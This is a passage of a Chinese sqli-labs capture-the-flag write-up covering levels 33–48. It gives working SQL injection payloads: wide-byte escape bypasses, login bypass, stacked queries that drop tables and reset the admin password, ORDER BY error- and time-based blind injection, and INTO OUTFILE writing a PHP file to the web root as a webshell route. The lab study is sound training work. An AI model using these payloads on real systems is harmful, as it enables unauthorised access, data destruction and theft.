<h4 id="less33"><a href="#less33" class="headerlink" title="less33"></a>less33</h4><p>本关卡和上关卡的playload是一样的</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.18.9.91/sqli-labs-master/Less-33/?id=-1%df' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">database</span>()<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>从源码中看到：</p>
<p><img src="/2019/12/27/sqli-labs-writeup/58.png" alt></p>
<p>此处过滤使用的函数为addslashes(),该函数返回在预定义字符之前添加反斜杠的字符串，其中预定义字符为：</p>
<ul>
<li>单引号（’）</li>
<li>双引号（“）</li>
<li>反斜杠（\）</li>
</ul>
<p>tips：该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串。<br>Addslashes()函数和我们在 32 关实现的功能基本一致的， 所以我们依旧可以利用%df 进行绕<br>过。<br>Notice： 使用 addslashes(),我们需要将 mysql_query 设置为 binary 的方式， 才能防御此漏洞。<br>Mysql_query(“SET<br>character_set_connection=gbk,character_set_result=gbk,character_set_client=binary”,$conn);  </p>
<h4 id="less34"><a href="#less34" class="headerlink" title="less34"></a>less34</h4><p>本关卡是post型注入漏洞，同样的也是将post内容进行<code>&#39;\</code>的处理，由上面的例子可以看到这边的方法就是将过滤函数添加\吃掉。而get型的方式通过url形式提交，数据会通过urlencode，将该方法用在post型注入中，思路是将utf-8转换为utf-16或者utf-32，例如将 ‘ 转换为utf-16为� ‘  ，就可以利用这个方式进行尝试。</p>
<p>此关卡使用万能密码的方式进行突破。</p>
<p>通过burpsuite进行拦截报文，并将其进行修改成相应的参数，进行注入：</p>
<p><img src="/2019/12/27/sqli-labs-writeup/59.png" alt></p>
<p>通过结果图可以看到，在没使用密码的情况下获知了账号密码。</p>
<p>原始的 sql 语句为</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@$sql="<span class="keyword">SELECT</span> username, <span class="keyword">password</span> <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> username=<span class="string">'$uname'</span></span><br><span class="line"><span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">'$passwd'</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span><span class="string">";</span></span><br></pre></td></tr></table></figure>

<p>此时 sql 语句为</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT username, password <span class="keyword">FROM</span><span class="built_in"> users </span>WHERE <span class="attribute">username</span>=<span class="string">'admin� '</span> <span class="keyword">or</span> 1#<span class="string">' and</span></span><br><span class="line"><span class="string">password='</span><span class="variable">$passwd</span><span class="string">' LIMIT 0,1</span></span><br></pre></td></tr></table></figure>

<p>Explain： SELECT username, password FROM users WHERE username=’admin� ‘ or 1<br>起到作用， 后面的则被#注释掉了。 而起作用的的语句不论 select 选择出来的内 容是什么与 1 进行 or 操作后， 始终是 1。  </p>
<p><img src="/2019/12/27/sqli-labs-writeup/60.png" alt></p>
<p>通过修改limit 后面的数字进行查询不同用户的账号密码。</p>
<h4 id="less35"><a href="#less35" class="headerlink" title="less35"></a>less35</h4><p>less35和less33大致是一样的，唯一的区别在于sql语句的不同。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql="<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=$<span class="keyword">id</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span><span class="string">";</span></span><br></pre></td></tr></table></figure>

<p>区别在于id没有经过单引号的处理，所以没有必要考虑check_addslashes()函数的意义，直接提交playload</p>
<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/172.18.9.91/sqli</span>-labs-master/Less-<span class="number">35</span>/?id=-<span class="number">1</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> 1,2,<span class="title">database</span>() -- +</span></span><br></pre></td></tr></table></figure>

<h4 id="less36"><a href="#less36" class="headerlink" title="less36"></a>less36</h4><p><img src="/2019/12/27/sqli-labs-writeup/61.png" alt></p>
<p>从源码看到，在后端check_quotes()函数是利用mysql_real_escape_string()函数进行的过滤。mysql_real_escape_string()函数转义SQL语句中使用的字符中的特殊字符，下列字符受影响：</p>
<ul>
<li>\x00</li>
<li>\n</li>
<li>\r</li>
<li>\</li>
<li>‘</li>
<li>“</li>
<li>\x1a</li>
</ul>
<p>如果成功，则该函数返回被转义的字符串，如果失败，则返回false。但是mysql并没有设置成gbk,所以mysql_real_escape_string()依旧可以突破，方法和上述是一样的。</p>
<p>playload：</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">172.18</span>.<span class="number">9.91</span>/sqli-labs-master/Less<span class="number">-36</span>/?id=<span class="number">-1</span><span class="symbol">%EF</span><span class="symbol">%BF</span><span class="symbol">%BD</span>'union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,database()--+</span><br></pre></td></tr></table></figure>

<p>此时使用的<code>&#39;</code>的utf-16进行突破的，也可使用%df进行。</p>
<p>playload:</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">172.18</span>.<span class="number">9.91</span>/sqli-labs-master/Less-<span class="number">36</span>/?id=-<span class="number">1</span>%df<span class="symbol">'union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,database()<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>tip:在使用mysql_real_escape_string()时，要防护这种问题，只需将mysql设置为gbk即可。设置的代码为：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">Mysql_set_charset</span><span class="params">(<span class="string">'gbk'</span>,<span class="string">'$conn'</span>)</span></span></span><br></pre></td></tr></table></figure>

<h4 id="less-37"><a href="#less-37" class="headerlink" title="less-37"></a>less-37</h4><p>本关卡与34关卡是大致的，区别在于处理post内容使用的mysql_real_escape_string()函数，而不是addslashes()函数，但是原理是一致的。依旧使用万能密码进行突破。</p>
<p><img src="/2019/12/27/sqli-labs-writeup/62.png" alt></p>
<p>看到是可以正常登陆的。</p>
<p>总结：从上面几个关卡可以总结一下过滤<code>&#39;\</code>常用的三种方式是直接replace，addslashes(),mysql_real_escape_string()。三种方式仅仅依靠一个函数是不能完全防御的，所以在编写代码时需要考虑得更加仔细。</p>
<h2 id="第三部分-page-3-Stacked-injection"><a href="#第三部分-page-3-Stacked-injection" class="headerlink" title="第三部分/page-3 Stacked injection"></a>第三部分/page-3 Stacked injection</h2><h3 id="Background-8-stacked-injection"><a href="#Background-8-stacked-injection" class="headerlink" title="Background-8 stacked injection"></a>Background-8 stacked injection</h3><p>Stacked injections:堆叠注入。从词面的含义就可以看到是一堆sql语句（多条）一起执行，而在真实的运用中也是这样的，在mysql中，主要是命令行中，每一条语句结尾加<code>;</code>表示语句结束。这样就想到是不是可以多句一起使用，这个就叫做stack injection。</p>
<h4 id="0x01-原理介绍"><a href="#0x01-原理介绍" class="headerlink" title="0x01 原理介绍"></a>0x01 原理介绍</h4><p>在sql中，分号（；）是用来表示一条sql语句的结束，试想一下在 ； 结束一个sql语句后构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection(联合注入)也是将两条语句合并在一起，两者的区别在于union或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。</p>
<p>例如：</p>
<pre><code>用户输入：
1;delete from products

服务器端生成的sql语句为：（因为对输入的参数进行过滤）
Select * from products where productid=1;delete from products</code></pre><p>当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p>
<h4 id="0x02-堆叠注入的局限性"><a href="#0x02-堆叠注入的局限性" class="headerlink" title="0x02 堆叠注入的局限性"></a>0x02 堆叠注入的局限性</h4><p>堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。堆叠注入可以使用的平台：</p>
<p><img src="/2019/12/27/sqli-labs-writeup/63.png" alt></p>
<p>虽然堆叠查询可以执行任意的sql语句，但是这种注入方式并不是十分的完美，在web系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，在前端界面是无法看到返回结果的。</p>
<p>因此，在读取数据时，还是建议使用union（联合）注入。同时在使用堆叠注入之前，需要知道一些数据库相关的信息，例如表名，列名等信息。</p>
<h4 id="0x03-Mysql示例"><a href="#0x03-Mysql示例" class="headerlink" title="0x03 Mysql示例"></a>0x03 Mysql示例</h4><p>（1）新建表格 select * from users where id=1;create table test like users;</p>
<p><img src="/2019/12/27/sqli-labs-writeup/64.png" alt></p>
<p>这边看见是已经创建成功，验证一下：</p>
<p><img src="/2019/12/27/sqli-labs-writeup/65.png" alt></p>
<p>(2)删除上面新建的test表，select * from users where id=1;drop table test;</p>
<p><img src="/2019/12/27/sqli-labs-writeup/66.png" alt></p>
<p>(3)查询数据 select * from users where id=1;select 1,2,3;</p>
<p><img src="/2019/12/27/sqli-labs-writeup/67.png" alt></p>
<p>(4)修改数据 select * from users where id=1;insert into users(id,username,password) values(‘100’,’new’,’new’);</p>
<p><img src="/2019/12/27/sqli-labs-writeup/68.png" alt></p>
<h4 id="less-38"><a href="#less-38" class="headerlink" title="less-38"></a>less-38</h4><p>本关卡就是使用stacked injection的相关知识，在执行select时的sql语句为：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * <span class="keyword">FROM</span><span class="built_in"> users </span>WHERE <span class="attribute">id</span>=<span class="string">'$id'</span> LIMIT 0,1;</span><br></pre></td></tr></table></figure>

<p>可以直接构造如下的playload:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.18.9.91/sqli-labs-master/Less-38/index.php?id=1';<span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span>(<span class="keyword">id</span>,username,<span class="keyword">password</span>) <span class="keyword">values</span> (<span class="string">'38'</span>,<span class="string">'less38'</span>,<span class="string">'hello'</span>)<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/27/sqli-labs-writeup/69.png" alt></p>
<p><img src="/2019/12/27/sqli-labs-writeup/70.png" alt></p>
<p>可以看到数据库表中已经将刚刚内容插入进去了。</p>
<h4 id="less39"><a href="#less39" class="headerlink" title="less39"></a>less39</h4><p>和less38的区别在于sql语句的不一样</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * <span class="keyword">FROM</span><span class="built_in"> users </span>WHERE <span class="attribute">id</span>=<span class="variable">$id</span> LIMIT 0,1</span><br></pre></td></tr></table></figure>

<p>也就是id没有进行处理。构造如下playload：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.18.9.91/sqli-labs-master/Less-39/?id=1;<span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span>(<span class="keyword">id</span>,username,<span class="keyword">password</span>) <span class="keyword">values</span> (<span class="string">'39'</span>,<span class="string">'less39'</span>,<span class="string">'hello'</span>)<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/27/sqli-labs-writeup/71.png" alt></p>
<p>通过数据库查看添加的内容：</p>
<p><img src="/2019/12/27/sqli-labs-writeup/72.png" alt></p>
<h4 id="less40"><a href="#less40" class="headerlink" title="less40"></a>less40</h4><p>本关卡的sql语句为：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * <span class="keyword">FROM</span><span class="built_in"> users </span>WHERE id=(<span class="string">'$id'</span>) LIMIT 0,1</span><br></pre></td></tr></table></figure>

<p>根据sql语句构造相应的playload：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.18.9.91/sqli-labs-master/Less-40/index.php?id=1');<span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span>(<span class="keyword">id</span>,username,<span class="keyword">password</span>) <span class="keyword">values</span> (<span class="string">'40'</span>,<span class="string">'less40'</span>,<span class="string">'hello40'</span>)<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/27/sqli-labs-writeup/73.png" alt></p>
<h4 id="less41"><a href="#less41" class="headerlink" title="less41"></a>less41</h4><p>此处与less39是一致的，区别在于41错误不会回显，所以这边是盲注。</p>
<p>playload:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.18.9.91/sqli-labs-master/Less-41/index.php?id=1; <span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span>(<span class="keyword">id</span>,username,<span class="keyword">password</span>) <span class="keyword">values</span> (<span class="string">'41'</span>,<span class="string">'less41'</span>,<span class="string">'hello41'</span>)<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/27/sqli-labs-writeup/74.png" alt></p>
<h4 id="less42"><a href="#less42" class="headerlink" title="less42"></a>less42</h4><p>update更新数据之后，经过mysql_real_escape_string()处理后的数据，存入到数据库当中后不会发生改变。在select调用的时候才能发挥作用，所以不用考虑在更新密码处进行注入，这关和二次注入的思路是不一样的。从login.php源码进行分析：</p>
<p><img src="/2019/12/27/sqli-labs-writeup/75.png" alt></p>
<p>Password变量在post过程中，没有通过mysql_real_escape_string()函数的处理，因此在登录的时候密码选项可以进行攻击。</p>
<p>登录用户名随意</p>
<p>密码使用：</p>
<pre><code>c&apos;;drop table me#    (删除me表)
c&apos;;create table me like users#    (创建me表)</code></pre><p>在注入前先查看原来security数据库中的表：</p>
<p><img src="/2019/12/27/sqli-labs-writeup/76.png" alt></p>
<p>在登录界面随便输入内容，然后使用burpsuite拦截报文，并做相应的修改</p>
<p><img src="/2019/12/27/sqli-labs-writeup/77.png" alt></p>
<p>当报文发送到后台时，原sql语句为：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * <span class="keyword">FROM</span><span class="built_in"> users </span>WHERE <span class="attribute">username</span>=<span class="string">'$username'</span> <span class="keyword">and</span> <span class="attribute">password</span>=<span class="string">'$password'</span></span><br></pre></td></tr></table></figure>

<p>通过playload构造的sql语句为</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * <span class="keyword">FROM</span><span class="built_in"> users </span>WHERE <span class="attribute">username</span>=<span class="string">'admin'</span> <span class="keyword">and</span> <span class="attribute">password</span>=<span class="string">'c'</span>;create table less42 like users#</span><br></pre></td></tr></table></figure>

<p>利用stacked injection，进入命令行查看是否成功创建表格。</p>
<p><img src="/2019/12/27/sqli-labs-writeup/78.png" alt></p>
<p>利用c’;drop table less42#作为登录密码，删除该表。</p>
<p>同样的利用此方式可以更新和插入数据项。这边演示通过update进行更改用户admin的密码，然后登录。</p>
<p><img src="/2019/12/27/sqli-labs-writeup/79.png" alt></p>
<p><img src="/2019/12/27/sqli-labs-writeup/80.png" alt></p>
<h4 id="less43"><a href="#less43" class="headerlink" title="less43"></a>less43</h4><p>本关卡从源码来看与less42是一样的原理，主要的区别在于sql语句的不一样。在本关卡sql语句为：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * <span class="keyword">FROM</span><span class="built_in"> users </span>WHERE username=(<span class="string">'$username'</span>) <span class="keyword">and</span> password=(<span class="string">'$password'</span>)</span><br></pre></td></tr></table></figure>

<p>登录</p>
<pre><code>username：admin
password：1&apos;);update users password=&apos;less43&apos; where username=&apos;admin&apos;#</code></pre><p>具体的演示就不做了，跟上面的一样。</p>
<h4 id="less44"><a href="#less44" class="headerlink" title="less44"></a>less44</h4><p>本关卡是基于盲注的，主要是没有报错信息，所以采用盲注的方式，但是我觉得有没有报错信息在堆叠注入好像并没有多大关系，也没有看是什么报错，主要还是构造号后面的注入语句。</p>
<p>登录</p>
<pre><code>username:admin
password:1&apos;;update users password=&apos;less44&apos; where username=&apos;admin&apos;#</code></pre><p>具体参看less42</p>
<h4 id="less45"><a href="#less45" class="headerlink" title="less45"></a>less45</h4><p>本关卡是less43基于盲注的，所以playload是与less43一致，只不过less45没有报错信息，但是并不影响结果。</p>
<p>登录信息：</p>
<pre><code>username：admin
password：1&apos;;update users password=&apos;less45&apos; where username=&apos;admin&apos;#</code></pre><h3 id="Background-9-order-by-后的injection"><a href="#Background-9-order-by-后的injection" class="headerlink" title="Background-9 order by 后的injection"></a>Background-9 order by 后的injection</h3><h4 id="less46"><a href="#less46" class="headerlink" title="less46"></a>less46</h4><p>本关卡开始，是通过order by相关注入知识</p>
<p>该关卡的sql语句为</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * <span class="keyword">FROM</span><span class="built_in"> users </span>ORDER BY <span class="variable">$id</span></span><br></pre></td></tr></table></figure>

<p>尝试?sort=1 desc或者asc，显示的结果不同，则表明可以注入。</p>
<p><img src="/2019/12/27/sqli-labs-writeup/81.png" alt></p>
<p><img src="/2019/12/27/sqli-labs-writeup/82.png" alt></p>
<p>从上面的结果看，是可以进行注入，上述的sql语句中可以看到，注入点在order by后面的参数中，而order by 不同于的where后面的注入点，不能使用union等进行注入。关于order by注入的方式，先查看下mysql的官方文档：</p>
<p><img src="/2019/12/27/sqli-labs-writeup/83.png" alt></p>
<p>可利用order by后的一些参数进行注入：</p>
<p>首先：</p>
<p>(1) order by后的数字可以作为一个注入点，也就是构造order by 后的一个语句，让该语句执行结果为一个数，尝试</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://<span class="number">172.18</span><span class="number">.9</span><span class="number">.91</span>/sqli-labs-master/Less<span class="number">-46</span>/?<span class="built_in">sort</span>=<span class="literal">right</span>(<span class="built_in">version</span>(),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>没有报错，但是right换成left是一样的，说明数字没有起到作用，考虑使用布尔类型，此时可以使用报错注入和延时注入。</p>
<p>此处可以直接构造？sort=后面的一个参数，此时有三种形式</p>
<p>①直接添加注入语句，?sort=(select ***)</p>
<p>②利用一些函数，例如rand()函数等。?sort=rand(sql语句)</p>
<p>ps：这边看一下rand（true）和rand（false）得结果是不一样的</p>
<p><img src="/2019/12/27/sqli-labs-writeup/84.png" alt></p>
<p><img src="/2019/12/27/sqli-labs-writeup/85.png" alt></p>
<p>③利用and，例如?sort=1 and (加sql语句)</p>
<p>同时，sql语句可以利用报错注入和延时注入的方式，语句可以灵活构造。</p>
<p>报错注入例子：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">172.18</span><span class="number">.9</span><span class="number">.91</span>/sqli-labs-master/Less<span class="number">-46</span>/?sort=(<span class="keyword">select</span> count(*) <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">group</span> <span class="keyword">by</span> concat(<span class="number">0x3a</span>,<span class="number">0x3a</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x3a</span>,<span class="number">0x3a</span>,floor(rand()*<span class="number">2</span>)))</span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/27/sqli-labs-writeup/86.png" alt></p>
<p>上述图片看到数据库用户名为root@localhost的用户名</p>
<p>使用rand()进行演示，前面看到rand(true)和rand(false)结果是不一样的。</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">172.18</span>.<span class="number">9.91</span>/sqli-labs-master/Less-<span class="number">46</span>/?<span class="keyword">sort</span>=rand(<span class="keyword">ascii</span>(<span class="keyword">left</span>(database(),<span class="number">1</span>))=<span class="number">115</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/27/sqli-labs-writeup/87.png" alt></p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">172.18</span>.<span class="number">9.91</span>/sqli-labs-master/Less-<span class="number">46</span>/?<span class="keyword">sort</span>=rand(<span class="keyword">ascii</span>(<span class="keyword">left</span>(database(),<span class="number">1</span>))=<span class="number">116</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/27/sqli-labs-writeup/88.png" alt></p>
<p>从上面的两个图对比rand（true）和rand（false）的结果看。报错注入是成功的。</p>
<p>延时注入的例子：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://172.18.9.91/sqli-labs-master/Less-46/?sort= (<span class="keyword">select</span> <span class="keyword">if</span>(<span class="keyword">substring</span>(<span class="keyword">current</span>,<span class="number">1</span>,<span class="number">1</span>)=<span class="built_in">char</span>(<span class="number">115</span>),<span class="keyword">benchmark</span>(<span class="number">50000000</span>,<span class="keyword">md5</span>(<span class="string">'1'</span>)),<span class="literal">null</span>) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">database</span>() <span class="keyword">as</span> <span class="keyword">current</span>) <span class="keyword">as</span> tb1)</span><br><span class="line"><span class="keyword">http</span>://<span class="number">172.18</span><span class="number">.9</span><span class="number">.91</span>/sqli-labs-<span class="keyword">master</span>/<span class="keyword">Less</span><span class="number">-46</span>/?<span class="keyword">sort</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">if</span>(<span class="keyword">ascii</span>(<span class="keyword">substr</span>(<span class="keyword">database</span>(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">116</span>,<span class="number">0</span>,<span class="keyword">sleep</span>(<span class="number">5</span>))</span><br></pre></td></tr></table></figure>

<p>上述两个延时注入的例子可以看出明显的看出时间的不同。</p>
<p>同时也可以使用?sort=1 and 后添加注入语句</p>
<p>(2)procedure analyse 参数后注入</p>
<p>利用procedure analyse参数，可以执行报错注入，同时，在procedure analyse和order by 之间可以存在limit 参数，实际应用中，往往也可能会存在limit后的注入，可以利用procedure analyse进行注入。</p>
<figure class="highlight cal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">172.18</span>.<span class="number">9.91</span>/sqli-labs-master/Less-<span class="number">46</span>/?sort=<span class="number">1</span> <span class="function"><span class="keyword">procedure</span> <span class="title">analyse</span><span class="params">(extractvalue(rand()</span>,<span class="title">concat</span><span class="params">(0x3a,version()</span>)),1)</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/27/sqli-labs-writeup/89.png" alt></p>
<p>(3)导入导出文件 into outfile参数</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://<span class="number">172.18</span><span class="number">.9</span><span class="number">.91</span>/sqli-labs-master/Less<span class="number">-46</span>/?<span class="built_in">sort</span>=<span class="number">1</span> <span class="keyword">into</span> outfile <span class="string">"D:\\phpStudy\\WWW\\sqli-labs-master\\test1.txt"</span></span><br></pre></td></tr></table></figure>

<p>将查询结果导入到文件中：</p>
<p><img src="/2019/12/27/sqli-labs-writeup/90.png" alt></p>
<p>这时就可以使用上传网马，利用lines terminated by</p>
<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">into outfileD:<span class="symbol">\\</span>phpStudy<span class="symbol">\\</span>WWW<span class="symbol">\\</span>sqli-labs-master<span class="symbol">\\</span>test1.txt lines terminated by 0x(网马进行16进制转换)</span><br></pre></td></tr></table></figure>

<h4 id="less47"><a href="#less47" class="headerlink" title="less47"></a>less47</h4><p>本关卡sql语句为：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * <span class="keyword">FROM</span><span class="built_in"> users </span>ORDER BY <span class="string">'$id'</span></span><br></pre></td></tr></table></figure>

<p>将id变成字符型，因此依旧按照注入的位置进行分类。</p>
<p>(1)order by后的参数</p>
<p>只能使用and来进行a报错或者延时注入。</p>
<p>①and rand 相结合的方式</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">172.18</span>.<span class="number">9.91</span>/sqli-labs-master/Less-<span class="number">47</span>/index.php?sort=<span class="number">1</span><span class="symbol">'and</span> rand(ascii(left(database(),<span class="number">1</span>))=<span class="number">115</span>)<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/27/sqli-labs-writeup/91.png" alt></p>
<p>换成116</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs-master/Less-47/index.php?sort=1%</span></span><br><span class="line"><span class="number">27</span><span class="keyword">and</span>%<span class="number">20</span>rand(ascii(left(database(),<span class="number">1</span>))=<span class="number">115</span>)--+</span><br></pre></td></tr></table></figure>

<p>mysql天书里面是说会不一样，但是我这边测试是一样的。。。。</p>
<p>此处后期经过测试， 还是存在问题的， 我们不能使用这种方式进行准确的注入。 此处留下只<br>是一个示例。  </p>
<p>②可以利用报错的方式进行</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-47/index.php?sort=1' and (<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> information_schema.columns <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">concat</span>(<span class="number">0x3a</span>,<span class="number">0x3a</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x3a</span>,<span class="number">0x3a</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>()*<span class="number">2</span>)))<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/27/sqli-labs-writeup/92.png" alt></p>
<p>可以看到user()的内容，同时可以构造其他语句进行注入。</p>
<p>③延时注入</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/sqli-labs-master/</span>Less-<span class="number">47</span><span class="regexp">/index.php?sort=1' and if(ascii(substr(database(),1,1))=115,0,sleep(5))--+</span></span><br></pre></td></tr></table></figure>

<p>这里因 database()为 security， 所以第一个字母的 s 的 ascii 为 115， 此处直接显示， 当改为116 或者其他的数字的时候， 就要延时了  </p>
<p>（2） procedure analyse 参数后注入</p>
<p>利用 procedure analyse 参数， 我们可以执行报错注入。 同时， 在 procedure analyse 和 order by 之间可以存在 limit 参数， 我们在实际应用中， 往往也可能会存在 limit 后的注入， 可以利用 procedure analyse 进行注入。<br>以下为示范例</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span>.<span class="number">0.1</span>/sqli-labs-master/Less-<span class="number">47</span>/index.php?sort=<span class="number">1</span>' <span class="keyword">procedure</span> <span class="title">analyse</span>(extractvalue(rand(),concat(0x3a,version())),1)<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>(3)导入导出文件 into outfile 参数  </p>
<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.18.9.91/sqli-labs-master/Less-47/?sort=1' into outfile "D:<span class="symbol">\\</span>phpStudy<span class="symbol">\\</span>WWW<span class="symbol">\\</span>sqli-labs-master<span class="symbol">\\</span>test.txt"-- +</span><br></pre></td></tr></table></figure>

<p>将查询结果导入到文件当中</p>
<p><img src="/2019/12/27/sqli-labs-writeup/93.png" alt></p>
<p>可以考虑上传网马，利用lines terminated by.</p>
<p>into outfile D:\phpStudy\WWW\sqli-labs-master\test.txt terminated by 0x(网马进行16进制转换)</p>
<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.18.9.91/sqli-labs-master/Less-47/?sort=1' into outfile "D:<span class="symbol">\\</span>phpStudy<span class="symbol">\\</span>WWW<span class="symbol">\\</span>sqli-labs-master<span class="symbol">\\</span>test.php" lines terminated by 0x3c3f70687020706870696e666f28293b3f3e2020--+</span><br></pre></td></tr></table></figure>

<p>此处16进制文件为 <code>&lt;?php phpinfo();?&gt;</code></p>
<p>访问test.php</p>
<p><img src="/2019/12/27/sqli-labs-writeup/94.png" alt></p>
<h4 id="less48"><a href="#less48" class="headerlink" title="less48"></a>less48</h4><p>该关卡和less46的区别在于报错注入无法使用，不进行错误回显，但是其余方法是可以使用的。</p>
